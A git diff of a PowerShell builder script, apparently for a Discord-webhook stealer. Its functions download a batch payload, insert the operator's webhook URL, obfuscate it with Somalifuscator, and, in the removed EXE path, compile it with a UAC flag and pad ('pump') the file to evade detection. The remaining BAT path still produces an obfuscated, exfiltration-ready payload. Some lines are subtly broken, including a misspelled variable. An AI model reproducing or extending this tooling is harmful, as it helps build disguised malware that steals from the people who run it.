@@ -166,44 +166,22 @@ function Invoke-BAT {
     }
     Invoke-SPEECH "Obfuscating BAT"
     (New-Object System.Net.WebClient).DownloadFile('https://github.com/KDot227/Somalifuscator/archive/refs/heads/main.zip', 'somalifuscator.zip')
+    Remove-Item -Path $somalifuscator_dir -Recurse -Force -ErrorAction SilentlyContinue
     Expand-Archive -Path "somalifuscator.zip" -DestinationPath "somalifuscator"
     Remove-Item -Path "somalifuscator.zip"
     Invoke-SPEECH "Successfully Downloaded Somalifuscator"
     $current_dir = Get-Location
-    $somalifuscator_dir = $current_dir.ToString() + "\somalifuscator\Somalifuscator-main"
+    $somalifuscator_dir = $current_dir.ToString() + "\somalifuscator\SomalifuscatorV2-main"
     #call setup.bat
-    & $somalifuscator_dir\setup.bat $current_dir\main.bat ultimate
+    & $somalifuscator_dir\setup.bat $current_dir\main.bat
+    Move-Item -Path "$somalfuscator_dir\main_obf.bat" -Destination "$current_dir\main_obf.bat"
     Invoke-SPEECH "Successfully Obfuscated BAT"
+    Remove-Item -Path $somalifuscator_dir -Recurse -Force -ErrorAction SilentlyContinue
 }
 
 function Invoke-EXE {
-    $webhook_url = $var_WEBHOOK_BOX.Text
-    $download_url=$download_url+"bat"
-    Invoke-WebRequest -Uri $download_url -OutFile "main.bat" -UseBasicParsing
-    (Get-Content "main.bat").Replace('YOUR_WEBHOOK_HERE2', $webhook_url) | Set-Content "main.bat"
-    Invoke-SPEECH "Successfully Built BAT"
-    Invoke-SPEECH "Obfuscating BAT"
-    (New-Object System.Net.WebClient).DownloadFile('https://github.com/KDot227/Somalifuscator/archive/refs/heads/main.zip', 'somalifuscator.zip')
-    Expand-Archive -Path "somalifuscator.zip" -DestinationPath "somalifuscator"
-    Remove-Item -Path "somalifuscator.zip"
-    Invoke-SPEECH "Successfully Downloaded Somalifuscator"
-    $current_dir = Get-Location
-    $somalifuscator_dir = $current_dir.ToString() + "\somalifuscator\Somalifuscator-main"
-    Start-Process -FilePath "$somalifuscator_dir\setup.bat" -ArgumentList "$current_dir\main.bat ultimate" -Wait -NoNewWindow
-    Invoke-SPEECH "Successfully Obfuscated BAT"
-    Remove-Item -Path $current_dir\main.bat -Force
-    Rename-Item -Path $current_dir\main.bat.ultimate.bat -NewName "main.bat" -Force
-    Set-Location $somalifuscator_dir
-    Start-Process -FilePath "$somalifuscator_dir\setup.bat" -ArgumentList "$current_dir\main.bat exe --uac" -Wait -NoNewWindow
-    Move-Item -Path $somalifuscator_dir\main.exe -Destination $current_dir -Force
-    Invoke-SPEECH "Successfully Built EXE"
-    Remove-Item -Path $current_dir\main.bat -ErrorAction SilentlyContinue
-    Remove-Item -Path $current_dir\main.bat.ultimate.bat -ErrorAction SilentlyContinue
-    $pump_box = [System.Windows.MessageBox]::Show("Do you want to pump the exe?", "Imagine?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
-    if (!($pump_box -ne "Yes")) {
-        Invoke-SPEECH "Pumping EXE"
-        Invoke-Pumper $current_dir\main.exe 7 $current_dir\main.exe 
-    }
+    [System.Windows.MessageBox]::Show("EXE MODE IS CURRENTLY UNAVAILABLE", "Ok?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
+    Invoke-SPEECH "Pick a new option LMAO"
 }
 
 function Invoke-AutoUpdate {
